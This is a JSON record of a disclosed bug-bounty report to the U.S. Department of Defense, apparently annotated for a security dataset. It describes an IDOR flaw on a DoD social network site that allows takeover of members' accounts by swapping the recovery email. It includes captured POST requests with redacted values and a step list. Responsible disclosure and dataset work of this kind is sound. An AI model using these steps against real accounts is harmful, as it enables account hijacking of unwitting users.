{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "r00tpgp ",
  "title": "Full Account Take-Over of \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Members via IDOR",
  "content": "\nSummary\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588 is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 end-point. By changing the following values in the POST request to the affected end-point:\nuserName\noriginalEmail\nEmail\nRecoveryEmail\nI am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:\nAttacker\nlogin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nVictim\nlogin: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI added \u2588\u2588\u2588\u2588 email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.\nAlso note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/self?guid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.\nThe IDOR bug can be obtained by intercepting the 2-FA Authentication switch:\n\u2588\u2588\u2588\nVulnerable End-Point\nHere is the vulnerable POST request when captured, the cookies and __RequestVerificationToken must be valid for this attack to work, I have highlighted the vulnerable IDOR parameters:\nPOST /self HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588/self\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 739\nConnection: close\nCookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588-Http-Session=\u2588\u2588\u2588; ga=\u2588\u2588\u2588\u2588\u2588; _gid=\u2588\u2588\u2588; AWSALB=\u2588\u2588\u2588\u2588\u2588; AWSALBCORS=\u2588\u2588\u2588\u2588; ASP.NET_SessionId=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; BIGipServer~Sync_Only~passport_pool=\u2588\u2588\u2588\u2588\u2588; akaalb_albcustom=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588def~id=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; AWSALB=\u2588\u2588\u2588; AWSALBCORS=\u2588\u2588\u2588\u2588\u2588\u2588; googtrans=/en/en; googtrans=/en/en; UserName=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-\u2588\u2588\u2588; _gat\u2588\u2588\u2588Tracker=1; RequestVerificationToken_Lw=\u2588\u2588\u2588\u2588\u2588\nUpgrade-Insecure-Requests: 1\n__RequestVerificationToken=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&userName=\u2588\u2588\u2588\u2588&originalEmail=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%40gmail.com&oldPassword=&EmailSent=False&RecoveryEmailSent=true&RecoveryEmailVerified=true&SecurityImagePath=&Translate=en&COIGroupID=&Username=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&Email=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588%40gmail.com&ConfirmEmail=&RecoveryEmail=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&ConfirmRecoveryEmail=&NewPassword=&ConfirmPassword=&TwoFactorAuthenticationEnabled=false&Password=&Password=&Password=&Password=&Password=\nImpact\nAn attacker can add his email address into the recovery field of any \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.\nAlso, victim login id is easily retrievable from this end point. By running the RequesteeId using any valid user session, attacker is able to retrieve the ProfileUrl containing the victims' login id.\nRequest\nPOST /api.ashx/v2/users/\u2588\u2588\u2588\u2588/friends.json HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: application/json, text/javascript, /; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nAuthorization-Code: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRest-Authorization-Code: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nX-Requested-With: XMLHttpRequest\nContent-Length: 35\nOrigin: https://\u2588\u2588\u2588\u2588\nConnection: close\nReferer: https://\u2588\u2588\u2588\u2588/members/\u2588\u2588\u2588/\nCookie: _ga=\u2588\u2588\u2588\u2588\u2588\u2588\u2588; _gid=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; AWSALB=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; AWSALBCORS=\u2588\u2588\u2588\u2588\u2588; \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588-Http-Session=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; googtrans=/en/en; UserName=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\u2588\u2588\u2588\u2588\u2588; CAMS_SID_MYCAMSCLUSTER_SYSTEM=MyCamsCluster-MyCamsServer1-system-\u2588\u2588\u2588\u2588; akaalb_albcommunity=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; AuthorizationCookie=\u2588\u2588\u2588; BIGipServer~Sync_Only~community_pool=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nRequesteeId=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&RequestMessage=+\nReply:\n{\n\"Friendship\": {\n\"CreatedDate\": \"2020-04-11T08:22:53.247\",\n\"FriendshipState\": \"Pending\",\n\"LastModifiedDate\": \"2020-04-11T08:22:53.247\",\n\"RequestMessage\": \" \",\n\"RequestorId\": \u2588\u2588\u2588\u2588\u2588\u2588,\n\"RequesteeId\": \u2588\u2588\u2588\u2588\u2588,\n\"User\": {\n\"AvatarUrl\": \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/cfs-file/__key/system/images/anonymous.gif\",\n\"DisplayName\": \"\u2588\u2588\u2588\u2588\u2588\",\n\"ProfileUrl\": \"https://\u2588\u2588\u2588\u2588/members/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n\"Username\": \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\n\"CurrentStatus\": null,\n\"Id\": \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n},\n\"Id\": \u2588\u2588\u2588\n},\n\"Info\": [],\n\"Warnings\": [],\n\"Errors\": []\n}\nTherefore, attacker just needs to feed the login id into the vulnerable end-point and follow the steps outlined in the PoC video to take over thousands of \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 user accounts!\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Insecure Direct Object Reference (IDOR)"
  ],
  "screenshots": {},
  "disclosed_date": 1589494080,
  "report_url": "https://hackerone.com/reports/847452",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Intercept the 2-FA Authentication switch request to capture the vulnerable POST request."
    ],
    [
      2,
      "Modify the POST request parameters (userName, originalEmail, Email, RecoveryEmail) to add a recovery email controlled by the attacker."
    ],
    [
      3,
      "Send the modified POST request to the vulnerable endpoint to update the victim's recovery email."
    ],
    [
      4,
      "Trigger a password reset to the attacker-controlled recovery email to gain full account access."
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to take over any member's account on a US DoD social network site by exploiting an IDOR (Insecure Direct Object Reference) bug. By manipulating specific parameters in a POST request, the attacker can add their own recovery email to the victim's account, enabling them to reset the password and gain full control. This works only if the victim has no recovery email or an unverified one.",
  "reason": "The attack involves multiple steps including intercepting a request, modifying parameters, and triggering a password reset. It requires understanding the application's state and the interaction between different components (2-FA switch, recovery email validation). However, the steps are straightforward once the vulnerable endpoint is identified.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": true,
  "authnz_byppass_detectable": false,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The reported IDOR vulnerability involves manipulating parameters (userName, originalEmail, Email, RecoveryEmail) in a POST request to modify another user's account recovery settings. The detection methodology outlined includes testing resource_id substitution (e.g., victim's email/user ID) across user sessions (attacker vs. victim). Since the attack relies on swapping resource IDs (victim's data) and testing authorization boundaries with different sessions (attacker's valid session), it aligns with steps 4a, 4b, and 4e of the proposed methodology. The system would capture the action (POST /self) and resource_type::resource_id (user account parameters), then test unauthorized access by substituting IDs/sessions, which would reveal the IDOR.",
    "is_simple_authnz": true
  }
}